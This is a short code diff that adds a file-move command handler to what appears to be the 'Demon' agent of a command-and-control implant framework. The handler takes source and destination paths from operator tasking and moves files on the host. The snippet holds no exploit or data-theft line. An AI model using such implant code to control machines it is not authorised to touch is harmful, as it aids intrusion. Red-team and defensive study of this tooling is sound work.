@@ -1028,6 +1028,32 @@ VOID CommandFS( PPARSER Parser )
             break;
         }
 
+        case DEMON_COMMAND_FS_MOVE: PUTS( "FS::Move" )
+        {
+            UINT32 FromSize = 0;
+            UINT32 ToSize   = 0;
+            LPWSTR PathFrom = NULL;
+            LPWSTR PathTo   = NULL;
+            BOOL   Success  = FALSE;
+
+            PathFrom = ParserGetWString( Parser, &FromSize );
+            PathTo   = ParserGetWString( Parser, &ToSize );
+
+            PRINTF( "Move file %s to %s\n", PathFrom, PathTo )
+
+            Success = Instance.Win32.MoveFileExW( PathFrom, PathTo, MOVEFILE_REPLACE_EXISTING );
+            if ( ! Success ) {
+                PACKAGE_ERROR_WIN32
+                goto CLEAR_LEAVE;
+            }
+
+            PackageAddInt32( Package, Success );
+            PackageAddWString( Package, PathFrom );
+            PackageAddWString( Package, PathTo );
+
+            break;
+        }
+
         case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )
         {
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
